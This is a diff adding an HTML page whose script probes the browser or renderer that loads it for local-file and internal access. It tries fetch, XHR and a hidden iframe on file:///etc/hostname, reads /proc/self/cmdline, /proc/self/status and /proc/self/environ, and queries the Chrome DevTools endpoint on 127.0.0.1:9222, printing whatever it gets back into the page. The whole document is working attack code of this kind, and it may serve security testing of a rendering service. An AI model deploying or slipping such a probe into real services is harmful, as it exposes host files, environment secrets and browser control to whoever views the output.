@@ -1,0 +1,73 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P95</title></head>
+<body><pre id="out">Running...</pre>
+<script>
+"use strict";
+const O=document.getElementById("out");
+function log(s){O.textContent+="\n"+s;}
+log("UA: "+navigator.userAgent);
+
+// Try multiple file access methods
+async function tryFileAccess(){
+  // Method 1: fetch file://
+  try{
+    const r=await fetch('file:///etc/hostname');
+    const t=await r.text();
+    log("FETCH_FILE:"+t.trim());
+  }catch(e){log("FETCH_FILE_ERR:"+e.message);}
+
+  // Method 2: XMLHttpRequest
+  try{
+    const x=new XMLHttpRequest();
+    x.open('GET','file:///etc/hostname',false);
+    x.send();
+    log("XHR_FILE:"+x.responseText.trim());
+  }catch(e){log("XHR_FILE_ERR:"+e.message);}
+
+  // Method 3: fetch /proc/self/cmdline (reveals Chrome flags)
+  try{
+    const r=await fetch('file:///proc/self/cmdline');
+    const t=await r.text();
+    log("CMDLINE:"+t.replace(/\0/g,' ').substring(0,200));
+  }catch(e){log("CMDLINE_ERR:"+e.message);}
+
+  // Method 4: fetch /proc/self/status
+  try{
+    const r=await fetch('file:///proc/self/status');
+    const t=await r.text();
+    const name=t.match(/Name:\s*(\S+)/);
+    const pid=t.match(/Pid:\s*(\d+)/);
+    log("PROC:name="+((name&&name[1])||"?")+" pid="+((pid&&pid[1])||"?"));
+  }catch(e){log("PROC_ERR:"+e.message);}
+
+  // Method 5: iframe navigation to file://
+  try{
+    const f=document.createElement('iframe');
+    f.style.display='none';
+    f.src='file:///etc/hostname';
+    document.body.appendChild(f);
+    await new Promise(r=>setTimeout(r,2000));
+    try{
+      const t=f.contentDocument.body.innerText;
+      log("IFRAME_FILE:"+t.trim());
+    }catch(e){log("IFRAME_CROSS:"+e.message);}
+  }catch(e){log("IFRAME_ERR:"+e.message);}
+
+  // Method 6: WebSocket to 127.0.0.1:9222 (CDP if available)
+  try{
+    const r=await fetch('http://127.0.0.1:9222/json/version');
+    const d=await r.json();
+    log("CDP_VERSION:"+JSON.stringify(d).substring(0,200));
+  }catch(e){log("CDP_ERR:"+e.message);}
+
+  // Method 7: try /proc/self/environ
+  try{
+    const r=await fetch('file:///proc/self/environ');
+    const t=await r.text();
+    log("ENVIRON:"+t.replace(/\0/g,'\n').substring(0,300));
+  }catch(e){log("ENV_ERR:"+e.message);}
+
+  log("=== DONE ===");
+}
+tryFileAccess();
+</script></body></html>
